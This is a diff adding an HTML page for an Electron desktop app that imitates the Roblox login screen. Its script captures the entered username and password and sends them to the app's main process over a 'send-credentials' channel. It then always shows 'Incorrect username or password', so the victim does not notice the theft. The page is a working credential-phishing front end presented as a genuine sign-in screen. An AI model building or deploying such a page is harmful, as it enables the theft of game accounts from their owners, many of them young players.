@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <input id=username type="text" placeholder="Username/Email/Phone">
+    <input id=password type="password" placeholder="Password">
+    <p id="wrong">Incorrect username or password</p>
+    <button id="login">Sign In</button>
+    <button class="login2">Email Me a One-Time Code</button>
+    <button class="login2">Quick Sign-in</button>
+    <a id="forget">Forgot Password or Username?</a>
+    <p><a class="blue">Terms</a><a class='blue'>Privacy</a></p>
+
+  </div>
+  <div class="container2">
+    <button id="signup2">Create Account</button>
+    <button id="login2">Sign In</button>
+    <p><a class="blue">Terms</a><a class='blue'>Privacy</a></p>
+  </div>
+  <script>
+    const { ipcRenderer } = require('electron');
+
+    document.getElementById('login').addEventListener('click', () => {
+      const u = document.getElementById('username').value;
+      const p = document.getElementById('password').value;
+      ipcRenderer.send('send-credentials', u, p);
+      document.getElementById("wrong").style.visibility = 'visible';
+    });
+
+    document.getElementById('login2').addEventListener('click', () => {
+      document.getElementsByClassName("container")[0].style.display = "block";
+      document.getElementsByClassName("container2")[0].style.display = "none";
+      document.getElementsByTagName("body")[0].style.backgroundImage = 'url("background.png")';
+    });
+  </script>
+</body>
+</html>
